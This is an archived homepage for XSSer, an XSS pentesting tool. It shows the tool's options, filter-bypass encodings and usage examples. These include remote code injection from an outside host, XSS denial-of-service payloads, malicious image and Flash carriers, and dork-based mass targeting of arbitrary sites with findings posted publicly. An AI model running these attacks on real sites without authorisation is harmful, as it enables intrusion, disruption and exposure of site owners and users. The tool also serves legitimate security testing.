http://xsser.sourceforge.net/
HTTP/1.1 200 OK
Server: Apache/2.2.15 (CentOS)
Vary: Host
Last-Modified: Tue, 30 Oct 2012 19:50:17 GMT
ETag: "9988-4cd4c18601040"
Accept-Ranges: bytes
Cache-Control: max-age=172800
Expires: Sat, 26 Jul 2014 02:17:52 GMT
Content-Type: text/html
Content-Length: 39304
Date: Thu, 24 Jul 2014 02:17:52 GMT
X-Varnish: 1466316435
Age: 0
Via: 1.1 varnish
Connection: close

<!DOCTYPE HTML PUBLIC "-//W3C//Dtd HTML 4.01 transitional//EN" "http://www.w3.org/tr/html4/loose.dtd">
<html><head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="description" content="XSSer: automatic tool for pentesting XSS attacks against different applications">
<meta name="keywords" content="audit, browser, csrf, dcpxss, exploit, hack, hacking, hijacking, injection, pentesting, scripting, security,, test, testing, vulnerability, xas, xfs, xsf, xss, xssdom, xssdos">
<meta name="distribution" content="Global">
<meta name="author" content="psy">
<meta name="robots" content="all">
<meta name="rating" content="General">
<link rel="icon" href="http://xsser.sourceforge.net/favicon.ico" type="image/x-icon">
<link rel="alternate" type="application/rss+xml" title="XSser - RSS" href="https://sourceforge.net/export/rss2_keepsake.php?group_id=310700">
<link rel="stylesheet" href="xsser/style.css" type="text/css">
<title>XSSer: automatic tool for pentesting XSS attacks against different applications</title>
</head><body>
<div class="maintitle">
<img src="xsser/xsser.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications">
</div>

<div id="nav">
<ul>
<li><a href="http://sourceforge.net/projects/xsser/">SF page</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_XSSER">OWASP page</a></li>
<li><a href="#intro">Introduction</a></li>
<li><a href="#installation">Installation</a></li>
<li><a href="#usage">Usage</a></li>
<li><a href="#examples">Examples</a></li>
<li><a href="#screenshots">Screenshots</a></li>
<li><a href="#videotutorials">Videos</a></li>
<li><a href="#payloads">Payloads</a></li>
<li><a href="#download">Download</a></li>
<li><a href="#packages">Packages</a></li>
<li><a href="#changelog">Changelog</a></li>
<li><a href="#docs">Documentation</a></li>
<li><a href="#ml">Mailing list</a></li>
<li><a href="#license">License</a></li>
<li><a href="#author">Author</a></li>
<li><a href="#community">Community</a></li>
<li><a href="#contribute">Contribute</a></li>
<li><a href="#supports">Support</a></li>
<li><a href="http://sourceforge.net/projects/xsser/files/xsser_1.6-1.tar.gz/download">Get last version!</a></li>
</ul>
<p style="margin: 0pt; padding: 0pt; clear: both;"></p>
</div>
<div class="mainbody">
<div align="center">

</div>

<h1><a name="intro"></a>Introduction</h1>
<p>Cross Site "Scripter" (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications.<br><br>

It contains several options to try to bypass certain filters, and various special techniques of code injection.</p>

<h1>Current version</h1>
<table>
<tr>
<td>XSSer v1.6b ("The Mosquito: <u>Grey Swarm!</u>").<br><br>
<a href="xsser/xsser-greyswarm.png"><img src="xsser/xsser-greyswarm_sm.png" alt="XSSer Grey Swarm" border="0"></a><br>
<a href="xsser/xsser-greyswarm.png">+Click for Zoom</a><br>
<ul>
<li>Download original source code: <a href="http://sourceforge.net/projects/xsser/files/xsser_1.6-1.tar.gz/download">XSSer v1.6 -beta-</a></li>
<li>Ubuntu/Debian package: <a href="xsser/xsser-1.6_all.deb.tar.gz">XSSer-1.6_all.deb</a></li>
<li>ArchLinux package: <a href="http://aur.archlinux.org/packages.php?ID=43447">AUR link (v1.6b)</a></li>
<li>Gentoo package: <a href="http://perso.ikujam.org/xsser-1.6.1-ebuild.tar.gz">XSSer Gentoo ebuild (v1.6b)</a></li>
<li>RPM package: <a href="xsser/xsser-1.6-1.noarch.rpm.tar.gz">XSSer-1.6-1.noarch.rpm</a></li>
<li>Or update your copy directly from the XSSer -Subversion- repository:</li><br>

<u>$ svn co https://xsser.svn.sourceforge.net/svnroot/xsser xsser</u>

</ul>
This version include more features on the GTK+ interface:
</td>
</tr>
<tr>
<td><br>
<table>
<tr>
<td>
<a href="xsser/xsser-greyswarm-donate.png"><img src="xsser/xsser-greyswarm-donate_sm.png" alt="XSSer GTK+" border="0"></a><br>
<a href="xsser/xsser-greyswarm-donate.png">+Click for Zoom</a><br>
</td>
<td>
<a href="xsser/xsser-greyswarm-map.png"><img src="xsser/xsser-greyswarm-map_sm.png" alt="XSSer GTK+" border="0"></a><br>
<a href="xsser/xsser-greyswarm-map.png">+Click for Zoom</a><br>
</td>
</tr>
<tr>
<td>
<a href="xsser/xsser-greyswarm-check.png"><img src="xsser/xsser-greyswarm-check_sm.png" alt="XSSer GTK+" border="0"></a><br>
<a href="xsser/xsser-greyswarm-check.png">+Click for Zoom</a><br>
</td>
<td>
<a href="xsser/xsser-greyswarm-conn.png"><img src="xsser/xsser-greyswarm-conn_sm.png" alt="XSSer GTK+" border="0"></a><br>
<a href="xsser/xsser-greyswarm-conn.png">+Click for Zoom</a><br>
</td>
</tr>
</table>
</td>
</tr>
</table>
TIP: type: 'xsser --gtk' to start from shell. Or run directly XSSer from menu <img valign="middle" alt="xsser icon" src="xsser/xssericon_32x32.png">

<h1><a name="installation"></a>Installation</h1>
<p>
XSSer runs on many platforms.  It requires Python and the following libraries:<br><br>

    - python-pycurl - Python bindings to libcurl<br>
    - python-beautifulsoup - error-tolerant HTML parser for Python<br>
    - python-libxml2 - Python bindings for the GNOME XML library<br>
    - python-geoip - Python bindings for the GeoIP IP-to-country resolver library<br><br>

On Debian-based systems (ex: Ubuntu), run: <br><br>

    sudo apt-get install python-pycurl python-beautifulsoup python-libxml2 python-geoip
</p>

<h1><a name="usage"></a>Usage</h1>
<p>
xsser [OPTIONS] [-u <url> |-i <file> |-d <dork>] [-g <get> |-p <post> |-c <crawl>] [Request(s)] [Vector(s)] [Bypasser(s)] [Technique(s)] [Final Injection(s)]<br><br>

 Options:<br>

<table border="1">
<tr id="row1">
   <td> --version  <td>show program's version number and exit
<tr id="row2">
   <td> -h, --help   <td>show this help message and exit
<tr id="row3">
   <td> -s, --statistics   <td>show advanced statistics output results
<tr id="row4">
   <td> -v, --verbose  <td>active verbose mode output results	
<tr id="row5">
   <td> --gtk   <td>launch XSSer GTK Interface (Wizard included!)
</table>

<br>
 *Special Features*:<br>
    You can choose Vector(s) and Bypasser(s) to inject code with this
    extra special features:<br><br>

<table border="1">
<tr id="row1">
   <td> --imx=IMX  <td>create a false image with XSS code embedded
<tr id="row2">
   <td> --fla=FLASH  <td>create a false .swf file with XSS code embedded
</table>

<br>
 *Select Target(s)*:<br>
    At least one of these options has to be specified to set the source to get target(s) urls from.<br> 
    You need to choose to run XSSer:<br><br>

<table border="1">
<tr id="row1">
   <td> -u URL, --url=URL  <td>Enter target(s) to audit
<tr id="row2">
   <td> -i READFILE   <td>Read target URLs from a file
<tr id="row3">
   <td> -d DORK <td>Process search engine dork results as target urls
<tr id="row4">
   <td> --De=DORK_ENGINE <td>Search engine to use for dorking (bing, altavista,<br>
                        yahoo, baidu, yandex, youdao, webcrawler, google, etc.<br>
                        See dork.py file to check for available engines)   
</table>

<br>
 *Select type of HTTP/HTTPS Connection(s)*:<br>
    These options can be used to specify which parameter(s) we want to use
    like payload to inject code.<br><br>

<table border="1">
<tr id="row1">
   <td> -g GETDATA  <td>Enter payload to audit using GET. (ex: '/menu.php?q=')
<tr id="row2">
   <td> -p POSTDATA  <td>Enter payload to audit using POST. (ex: 'foo=1&bar=')
<tr id="row3">
   <td> -c CRAWLING  <td>Number of urls to crawl on target(s): 1-99999
<tr id="row4">
   <td>--Cw=CRAWLING_WIDTH  <td>Deeping level of crawler: 1-5
<tr id="row5">
   <td>--Cl <td>Crawl only local target(s) urls (default TRUE)
</table>

<br> 
 *Configure Request(s)*:<br>
    These options can be used to specify how to connect to target(s) payload(s).<br> 
    You can choose multiple:<br><br>

<table border="1">
<tr id="row1">
   <td> --cookie=COOKIE<td>Change your HTTP Cookie header
<tr id="row2">
   <td> --drop-cookie<td>Ignore Set-Cookie header from response
<tr id="row3">
   <td> --user-agent=AGENT<td>Change your HTTP User-Agent header (default SPOOFED)
<tr id="row4">
   <td> --referer=REFERER <td>Use another HTTP Referer header (default NONE)
<tr id="row5">
   <td> --xforw <td>Set your HTTP X-Forwarded-For with random IP values
<tr id="row6">
   <td> --xclient <td>Set your HTTP X-Client-IP with random IP values
<tr id="row7">
   <td> --headers=HEADERS <td>Extra HTTP headers newline separated
<tr id="row8">
   <td> --auth-type=ATYPE <td>HTTP Authentication type (Basic, Digest, GSS or NTLM)
<tr id="row9">
   <td> --auth-cred=ACRED <td>HTTP Authentication credentials (name:password)
<tr id="row10">
   <td> --proxy=PROXY <td>Use proxy server (tor: http://localhost:8118)
<tr id="row11">
   <td> --ignore-proxy <td>Ignore system default HTTP proxy
<tr id="row12">
   <td> --timeout=TIMEOUT <td>Select your timeout (default 30)
<tr id="row13">
   <td> --retries=RETRIES <td>Retries when the connection timeouts (default 1)
<tr id="row14">
   <td> --threads=THREADS <td>Maximum number of concurrent HTTP requests (default 5)
<tr id="row15">
   <td> --delay=DELAY <td>Delay in seconds between each HTTP request (default 0)
<tr id="row16">
   <td> --tcp-nodelay <td>Use the TCP_NODELAY option
<tr id="row17">
   <td> --follow-redirects <td>XSSer will follow server redirection responses (302)
<tr id="row18">
   <td> --follow-limit=FLI <td>Set how many times XSSer will follow redirections (default 50)

</table>

<br>
 *Checker Systems*:<br>
    This options are usefull to know if your target(s) have some filters against XSS attacks,<br> 
    to reduce 'false positive' results and to perform more advanced tests:<br><br>

<table border="1">
<tr id="row1">
   <td> --no-head <td>NOT verify the stability of the url (codes: 200|302) with a HEAD pre-check request
<tr id="row2">
   <td> --alive=ISALIVE <td>set limit of every how much errors XSSer must to verify that target is alive
<tr id="row3">
   <td> --hash <td>send an unique hash, without vectors, to pre-check if target(s) repeats all content recieved
<tr id="row4">
   <td> --heuristic <td>launch a heuristic testing to discover which parameters are filtered on target(s) code: ;\/<>"'=
<tr id="row5">
   <td> --checkaturl=ALT <td>check for a valid XSS response from target(s) at an alternative url. 'blind XSS'
<tr id="row6">
   <td> --checkmethod=ALTM <td>check responses from target(s) using a different connection type: GET or POST (default: GET)
<tr id="row7">
   <td> --checkatdata=ALD <td>check responses from target(s) using an alternative payload (default: same than first injection)
<tr id="row8">
   <td> --reverse-check <td>establish a reverse connection from target(s) to XSSer to certificate that is 100% vulnerable

</table> 

<br>
 *Select Vector(s)*:<br>
    These options can be used to specify a XSS vector source code to inject in each payload.<br>
    Important, if you don't want to try to inject a common XSS vector, used by default.<br>
    Choose only one option:<br><br>

<table border="1">
<tr id="row1">
   <td> --payload=SCRIPT <td>OWN - Insert your XSS construction -manually-
<tr id="row2">
   <td> --auto <td>AUTO - Insert XSSer 'reported' vectors from file (HTML5 vectors included!)

</table> 

<br>
 *Select Bypasser(s)*:<br>
    These options can be used to encode selected vector(s) to try to bypass all possible anti-XSS filters<br>
    on target(s) code and some IPS rules, if the target use it. Also, can be combined with other techniques to provide encoding:<br><br>

<table border="1">
<tr id="row1">
   <td> --Str<td>Use method String.FromCharCode()
<tr id="row2">
   <td> --Une<td>Use function Unescape()
<tr id="row3">
   <td> --Mix <td>Mix String.FromCharCode() and Unescape()
<tr id="row4">
   <td> --Dec <td>Use Decimal encoding
<tr id="row5">
   <td> --Hex <td>Use Hexadecimal encoding
<tr id="row6">
   <td> --Hes <td>Use Hexadecimal encoding, with semicolons
<tr id="row7">
   <td> --Dwo <td>Encode vectors IP addresses in DWORD
<tr id="row8">
   <td> --Doo <td>Encode vectors IP addresses in Octal
<tr id="row9">
   <td> --Cem <td>Try -manually- different Character Encoding mutations<br> (reverse obfuscation: good) -> (ex:'Mix,Une,Str,Hex')
</table>

<br> 
 *Special Technique(s)*:<br>
    These options can be used to try to inject code using different type
    of XSS techniques. You can choose multiple:<br><br>

<table border="1">
<tr id="row1">
   <td> --Coo <td>COO - Cross Site Scripting Cookie injection
<tr id="row2">
   <td> --Xsa <td>XSA - Cross Site Agent Scripting
<tr id="row3">
   <td> --Xsr <td>XSR - Cross Site Referer Scripting
<tr id="row4">
   <td> --Dcp <td>DCP - Data Control Protocol injections
<tr id="row5">
   <td> --Dom <td>DOM - Use Anchor Stealth (DOM shadows!)
<tr id="row6">
   <td> --Ind <td>IND - HTTP Response Splitting Induced code
<tr id="row7">
   <td> --Anchor <td>ANC - Use Anchor Stealth payloader (DOM shadows!)
<tr id="row8">
   <td> --Phpids <td>PHP - Exploit PHPIDS bug (0.6.5) to bypass filters
</table>

<br> 
  *Select Final injection(s)*:<br>
    These options can be used to specify the final code to inject in
    vulnerable target(s). Important, if you want to exploit<br> 
    on-the-wild your discovered vulnerabilities. Choose only one option:<br><br>

<table border="1">
<tr id="row1">
   <td> --Fp=FINALPAYLOAD <td>OWN    - Insert your final code to inject -manually-
<tr id="row2">
   <td> --Fr=FINALREMOTE <td>REMOTE - Insert your final code to inject -remotelly-
<tr id="row3">
   <td> --Doss <td>DOSs   - XSS Denial of service (server) injection              
<tr id="row4">
   <td> --Dos <td>DOS    - XSS Denial of service (client) injection
<tr id="row5">
   <td> --B64  <td>B64    - Base64 code encoding in META tag (rfc2397)
</table>

<br> 
 *Special Final injection(s)*:<br>
    These options can be used to execute some 'special' injection(s) in vulnerable target(s). <br>
    You can select multiple and combine with your final code (except with DCP code):<br><br>

<table border="1">
<tr id="row1">
   <td> --Onm <td>ONM - Use onMouseMove() event to inject code
<tr id="row2">
   <td> --Ifr <td>IFR - Use "iframe" source tag to inject code
</table>

<br> 
 *Miscellaneous*:<br><br>
<table border="1">
<tr id="row7">            
   <td> --silent <td>inhibit console output results
<tr id="row1">
   <td> --update <td>check for XSSer latest stable version
<tr id="row2">
   <td> --save <td>output all results directly to template (XSSlist.dat)
<tr id="row3">
   <td> --xml=FILEXML <td>output 'positives' to aXML file (--xml filename.xml)
<tr id="row4">
   <td> --short=SHORTURLS <td>display -final code- shortered (tinyurl, is.gd)
<tr id="row5">
   <td> --launch <td>launch a browser at the end with each XSS discovered
<tr id="row6">
   <td> --tweet <td>publish each XSS discovered into the 'Grey Swarm!'
<tr id="row7">
   <td> --tweet-tags=TT <td>add more tags to your XSS discovered publications (default: #xss) - (ex: #xsser #vulnerability)
</table>

</p>
<h1><a name="examples"></a>Examples</h1>
<p>
If you have interesting examples of usage about XSSer, please send an email to the <a href="https://lists.sourceforge.net/lists/listinfo/xsser-users">mailing list</a>.
</p>
-------------------<br>
<p>
* Simple injection from URL:<br><br>
<b>$ python xsser.py -u "http://host.com"</b><br>
-------------------<br>
* Simple injection from File, with tor proxy and spoofing HTTP Referer headers:<br><br>
<b>$ python xsser.py -i "file.txt" --proxy "http://127.0.0.1:8118" --referer "666.666.666.666"</b> <br>
-------------------<br>
* Multiple injections from URL, with automatic payloading, using tor proxy, injecting on payloads character encoding in "Hexadecimal", with verbose output and saving results to file (XSSlist.dat):<br><br>
<b>$ python xsser.py -u "http://host.com" --proxy "http://127.0.0.1:8118" --auto --Hex --verbose -w</b><br>
-------------------<br>
* Multiple injections from URL, with automatic payloading, using caracter encoding mutations (first, change payload to hexadecimal; second, change to StringFromCharCode the first encoding; third, reencode to Hexadecimal the second encoding), with HTTP User-Agent spoofed, changing timeout to "20" and using multithreads (5 threads):<br><br>
<b>$ python xsser.py -u "http://host.com" --auto --Cem "Hex,Str,Hex" --user-agent "XSSer!!" --timeout "20" --threads "5"</b><br>
-------------------<br>
* Advance injection from File, payloading your -own- payload and using Unescape() character encoding to bypass filters:<br><br>
<b>$ python xsser.py -i "urls.txt" --payload 'a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);' --Une</b><br>
-------------------<br>
* Injection from Dork selecting "duck" engine (XSSer Storm!):<br><br>
<b>$ python xsser.py --De "duck" -d "search.php?"</b><br>
-------------------<br>
* Injection from Crawler with deep 3 and 4 pages to see (XSSer Spider!):<br><br>
<b>$ python xsser.py -c3 --Cw=4 -u "http://host.com"</b><br>
-------------------<br>
* Simple injection from URL, using POST, with statistics results:<br><br>
<b>$ python xsser.py -u "http://host.com" -p "index.php?target=search&subtarget=top&searchstring=" -s</b><br>
-------------------<br>
* Multiple injections from URL to a parameter sending with GET, using automatic payloading, with IP Octal payloading ofuscation and printering results in a "tinyurl" shortered link (ready for share!):<br><br>
<b>$ python xsser.py -u "http://host.com" -g "bs/?q=" --auto --Doo --short tinyurl </b><br>
-------------------<br>
* Simple injection from URL, using GET, injecting a vector in Cookie parameter, trying to use a DOM shadow space (no server logging!) and if exists any "hole", applying your manual final payload "malicious" code (ready for real attacks!):<br><br>
<b>$ python xsser.py -u "http://host.com" -g "bs/?q=" --Coo --Dom --Fr="!enter your final injection code here!"</b><br>
-------------------<br>
* Simple injection from URL, using GET and trying to generate with results a "malicious" shortered link (is.gd) with a valid DoS (Denegation Of Service) browser client payload:<br><br>
<b>$ python xsser.py -u "http://host.com" -g "bs/?q=" --Dos --short "is.gd"</b><br>
-------------------<br>
* Multiple injections to multiple places, extracting targets from a list in a FILE, applying automatic payloading, changing timeout to "20" and using multithreads (5 threads), increasing delay between petitions to 10 seconds, injecting parameters in HTTP USer-Agent, HTTP Referer and in Cookie parameters, using proxy Tor, with IP Octal ofuscation, with statistics results, in verbose mode and creating shortered links (tinyurl) of any valid injecting payloads found. (real playing mode!): <br><br>
<b>$ python xsser.py -i "list_of_url_targets.txt" --auto --timeout "20" --threads "5" --delay "10" --Xsa --Xsr --Coo --proxy "http://127.0.0.1:8118" --Doo -s --verbose --Dos --short "tinyurl"</b><br>
-------------------<br>
* Injection of user XSS vector directly in a malicious -fake- image created "on the wild", and ready to be uploaded.<br><br>
<b>$ python xsser.py --Imx "test.png" --payload "!enter your malicious injection code here!" </b><br>
-------------------<br>
* Report output 'positives' injections of a dorking search (using "ask" dorker) directly to a XML file.<br><br>
<b>$ python xsser.py -d "login.php" --De "ask" --xml "security_report_XSSer_Dork_cuil.xml"    </b><br>
-------------------<br>
* Publish output 'positives' injections of a dorking search (using "duck" dorker) directly to <a href="http://identi.ca">http://identi.ca</a><br> (federated XSS pentesting botnet)<br><br>
<b>$ python xsser.py -d "login.php" --De "duck" --tweet</b><br><br>
* Examples online:<br><br>
- <a href="http://identi.ca/xsserbot01">http://identi.ca/xsserbot01</a><br>
- <a href="http://twitter.com/xsserbot01">http://twitter.com/xsserbot01</a><br>
-------------------<br>
* Create a .swf movie with XSS code injected<br><br>
<b>$ python xsser.py --fla "name_of_file"</b><br>
-------------------<br>
* Send a pre-checking hash to see if target will generate -false positive- results<br><br>
<b>$ python xsser.py -u "host.com" --hash</b><br>
-------------------<br>
* Multiple fuzzing injections from url, including DCP injections and exploiting our "own" code, spoofed in a shortered link, on positive results founded. XSS real-time exploiting.<br><br>

<b>$ python xsser.py -u "host.com" --auto --Dcp --Fp "enter_your_code_here" --short "is.gd"</b><br>
-------------------<br>
* Exploiting Base64 code encoding in META tag (rfc2397) in a manual payload of a vulnerable target.<br><br>
 
<b>$ python xsser.py -u "host.com" -g "vulnerable_path" --payload "valid_vector_injected" --B64</b><br>
-------------------<br>
* Exploiting our "own" -remote code- in a payload discovered using fuzzing and launch it in a browser directly<br><br>
 
<b>$ python xsser.py -u "host.com" -g "vulnerable_path" --auto --Fr "my_host/path/code.js" --launch</b><br>
</p>
<h1><a name="screenshots"></a>Screenshots</h1>

<p>
If you have interesting screenshots about XSSer, please send an email to the <a href="https://lists.sourceforge.net/lists/listinfo/xsser-users">mailing list</a>.
</p>
-------------------<br><br>
<table border="1" width="400">
<tr id="row1">
   <td><a href="xsser/xsser_help.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"><img src="xsser/xsser_help_sm.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"></a><td><a href="xsser/xsser_core_report.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"><img src="xsser/xsser_core_report_sm.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"></a>
<tr id="row2">
   <td>Core: Call to help main menu (--help) (v1.5)<td>Core: Example of automatic injections (v1.5)
<tr id="row3">
   <td><a href="xsser/xsser_finalcode.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"><img src="xsser/xsser_finalcode_sm.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"></a><td><a href="xsser/xsser_dcp.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"><img src="xsser/xsser_dcp_sm.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"></a>
<tr id="row4">
   <td>Core: Example of remote code (--Fr) (v1.0)<td>Core: Example of DCP injection (--Dcp) (v1.0)
<tr id="row5">
   <td><a href="xsser/xsser_documentation.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"><img src="xsser/xsser_documentation_sm.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"></a><td><a href="xsser/xsser_wizard.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"><img src="xsser/xsser_wizard_sm.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"></a>
<tr id="row6">
   <td>GTK: Documentation (v1.5)<td>GTK: Wizard Helper (v1.5)
<tr id="row7">
   <td><a href="xsser/xsser_reports.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"><img src="xsser/xsser_reports_sm.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"></a><td><a href="xsser/xsser_gtk2.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"><img src="xsser/xsser_gtk2_sm.png" alt="XSSer: automatic tool for pentesting XSS attacks against different applications"></a>
<tr id="row8">
   <td>GTK: Report crawling results from dork (v1.5)<td>GTK: Global Target(s) Geomap Reports (v1.5)
</table>

<h1><a name="videotutorials"></a>Videos</h1>
<p>
If you have interesting videos about XSSer, please send an email to the <a href="https://lists.sourceforge.net/lists/listinfo/xsser-users">mailing list</a>.
</p>
-------------------<br>
<p>
<u>Version of XSSer (v1.5)</u>:<br><br>


  - Video example of XSSer GTK interface.<br><br>

<embed src="http://www.youtube.com/watch?v=0UoVV3Oxq8g" type="application/x-shockwave-flash" width="480" height="404" allowscriptaccess="always" allowfullscreen="true"></embed>

</p>
<p>
<u>Old versions of XSSer (v0.5<)</u>:<br><br>

  - <a href="http://www.youtube.com/v/FahFdw_V0t4">Video1</a>: Simple automatic payloading vectors. *reported to target (06/07/2010)*.<br><br>

  - <a href="http://www.youtube.com/v/M4IzUMS66V0&hl=es&fs=1">Video2</a>: Server side Apache logging. *spoofing demostration*.<br><br>

  - <a href="http://www.youtube.com/v/RFOrUVJ5THY&hl=es&fs=1">Video3</a>: Dorking injections with stadistics results. *old explorer mode!*<br>
</p>

<h1><a name="payloads"></a>Payloads</h1>
<p>
XSSer uses a <a href="https://n-1.cc/pg/pages/view/16105/">list of XSS valid vectors</a> to make automatic payloading attacks on target(s).<br><br>

If you have interesting XSS "codes", please send an email to the <a href="https://lists.sourceforge.net/lists/listinfo/xsser-users">mailing list</a>.<br><br>

-------------------<br><br>

The reference table with supported browsers is:<br>
</p>
  <table border="1" width="700">
    <tr>
      <td>IE7.0<td>
      <td>Vector works in Internet Explorer 7.0.  Most recently tested with Internet Explorer 7.0.5700.6 RC1, Windows XP Professional SP2.<td>
    </tr>
    <tr>
      <td>IE6.0<td>
      <td>Vector works in Internet Explorer.  Most recently tested with Internet Explorer 6.0.28.1.1106CO, SP2 on Windows 2000.<td>
    </tr>
    <tr>
      <td>NS8.1-IE<td>
      <td>Vector works in Netscape 8.1+ in IE rendering engine mode.  Most recently tested with Netscape 8.1 on Windows XP Professional.  This used to be called trusted mode, but Netscape has changed it's security model away from the trusted/untrusted model and has opted towards Gecko as a default and IE as an option.<td>
    </tr>
    <tr>
      <td>NS8.1-G<td>
      <td>Vector works in Netscape 8.1+ in the Gecko rendering engine mode. Most recently tested with Netscape 8.1 on Windows XP Professional<td>
    </tr>
    <tr>
      <td>FF2.0<td>
      <td>Vector works in Mozilla's Gecko rendering engine, used by Firefox.  Most recently tested with Firefox 2.0.0.2 on Windows XP Professional.<td>
    </tr>
    <tr>
      <td>O9.02<td>
      <td>Vector works in Opera.  Most recently tested with Opera 9.02, Build 8586 on Windows XP Professional<td>
    </tr>
    <tr>
      <td>NS4<td>
      <td>Vector works in older versions of Netscape 4.0 - untested.<td>
    </tr>
  </table>
<br>
Injections are valid as proof that browsers. The attacker can run the desired code if any of the listings.
</p>

<h1><a name="download"></a>Download</h1>
<p>XSSer (<u>official version</u>) can be downloaded from its
<a href="http://sourceforge.net/projects/xsser/files/">SourceForge File List page</a>.
For now, download is available in the following format:</p>
<p>
</p><ul>
<li class="int">
<a href="http://sourceforge.net/projects/xsser/files/xsser_1.6-1.tar.gz/download">Source gzip compressed</a> operating system independent.
</li>
</ul>

<p>You can also checkout the latest development version from the XSSer -Subversion- repository:</p>
<p>
</p><blockquote><code>
</code><pre>$ svn co https://xsser.svn.sourceforge.net/svnroot/xsser xsser 
</pre>
</blockquote>

<h1><a name="packages"></a>Packages</h1>
<p> 
XSSer v1.6b: "Grey Swarm!" <u>(more updated)</u>:<br>
<ul>
<li>Archlinux: <a href="http://aur.archlinux.org/packages.php?ID=43447">AUR link</a></li><br>

<li>Gentoo: <a href="http://perso.ikujam.org/xsser-1.6.1-ebuild.tar.gz">XSSer Gentoo ebuild</a></li><br>

<li>RPM package: <a href="xsser/xsser-1.6-1.noarch.rpm.tar.gz">XSSer-1.6-1.noarch.rpm</a></li><br>

<li>
Ubuntu/Debian package: <a href="xsser/xsser-1.6_all.deb.tar.gz">XSSer-1.6_all.deb</a>
<ul>
<br>
<li>
<u>Installation:</u><br>
tar xzvf xsser-1.6_all.deb.tar.gz<br>
sudo dpkg -i xsser-1.6_all.deb<br><br>
<u>Run (GTK mode)</u>:<br> 
xsser --gtk --silent
</li>
</ul>
</li>
</ul>
</p>
-------------------<br>
<p>
XSSer v1.5: "Swarm Edition!":<br>
<ul>
<li>Archlinux:  <a href="http://aur.archlinux.org/packages.php?ID=43447">AUR link</a></li><br>

<li>
Ubuntu/Debian:  <a href="xsser/xsser_1.5-1_all.deb.tar.gz"> xsser_1.5-1_all.deb.tar.gz</a>
<ul>
</ul>
</li>
</ul>
</p>
-------------------<br>
<p>
XSSer v1.0: "The mosquito":<br>
<ul>
<li>Archlinux:  <a href="http://aur.archlinux.org/packages.php?ID=43447">AUR link</a></li><br>

<li>
Ubuntu/Debian:  <a href="xsser/xsser_1.0-2_all.deb.tar.gz"> xsser_1.0-2_all.deb.tar.gz</a>
<ul>
</ul>
</li>
</ul>
</p>

<h1><a name="changelog"></a>Changelog</h1>
<ul>
<li class="int">
<b><u>November, 28, 2011</u></b>:<br><br>

<a href="http://sourceforge.net/projects/xsser/">XSSer</a> <u>version 1.6 -beta-</u> aka <a href="http://sourceforge.net/projects/xsser/files/xsser_1.6-1.tar.gz/download">"Grey Swarm!"</a> released!!<br><br>

Core: Added Drop Cookie option + Added Random IP X-Forwarded-For option + Random X-Client-IP option + Added GSS and NTLM authentication methods + Added Ignore proxy option + Added TCP-NODELAY option + Added Follow redirects option + Added Follow redirects limiter parameter + Added Auto-HEAD precheck system + Added No-HEAD option + Added Isalive option + Added Check at url option (Blind XSS) + Added Reverse Check parameter + Added PHPIDS (v.0.6.5) exploit + Added More vectors to auto-payloading + Added HTML5 studied vectors + Fixed Different bugs on core + Fixed Curl handlerer options + Fixed Dorkerers system + Fixed Bugs on results propagation + Fixed POST requests.<br><br>

GTK: Added New features to GTK controller + Added Detailed views to GTK interface. <br><br>

<b>February, 25, 2011</b>:<br><br>

Added package for Archlinux. More info <a href="http://aur.archlinux.org/packages.php?ID=43447">here</a><br><br>

<b>February, 24, 2011</b>:<br><br>

<a href="http://sourceforge.net/projects/xsser/">XSSer</a> <u>version 1.5 -beta-</u> aka <a href="http://sourceforge.net/projects/xsser/files/xsser-1.5.tar.gz/download">"Swarm edition!"</a> released!!<br><br>

Core: Added GTK option + Heuristic test + HTTP Response Splitting (ak.a Induced attack!) + DoS (Server) injection + Final code (added DCP & DOM injections) + Update option + Code clean + Bugfixing + New options menu + More advanced statistics system + Updated dorkerers list.<br><br>

GTK: Intuitive navigation + Wizard helper (<u>"build your pentesting answering some questions"</u>) + Expert visor (with target(s) <u>geolocation included</u> + Documentation. <br><br>

Created XSSer package (v1.5) for Ubuntu/Debian based systems. 
<br>You can download here:<a href="xsser/xsser_1.5-1_all.deb.tar.gz"> xsser_1.5-1_all.deb.tar.gz</a><br><br>

<b>November, 13, 2010</b>:<br><br>

XSSer package for Archlinux can be found in the AUR. More info <a href="http://aur.archlinux.org/packages.php?ID=43447">here</a><br><br>

<b>November, 11, 2010</b>:<br><br>

Created XSSer package (v1.0) for Ubuntu/Debian based systems.
<br>You can download here: <a href="xsser/xsser_1.0-2_all.deb.tar.gz">xsser_1.0-2_all.deb.tar.gz</a><br><br>

<b>November, 9, 2010</b>:<br><br>

Added more advanced statistics results + Bugfixig. <br><br>

<b>November, 7, 2010</b>:<br><br>

<a href="http://sourceforge.net/projects/xsser/">XSSer</a> <u>version 1.0</u> aka <a href="http://sourceforge.net/projects/xsser/files/xsser-1.0.tar.gz/download">"The Mosquito"</a> released!!<br><br>

Added "final remote injections" option + Cross Flash Attack! + Cross Frame Scripting + Data Control Protocol Injections + Base64 (rfc2397) PoC + OnMouseMove PoC + Browser launcher + Code clean + Bugfixing + New options menu + Pre-check system + Crawler spidering clones + More advanced statistics system + "Mana" output results. <br><br>

<b>October, 8, 2010</b>:<br><br>
POC: Detecting, exploiting and reporting <a href="http://seclists.org/fulldisclosure/2010/Oct/85">"fcgi-bin/echo" Oracle vulnerability</a> with XSSer<br><br>

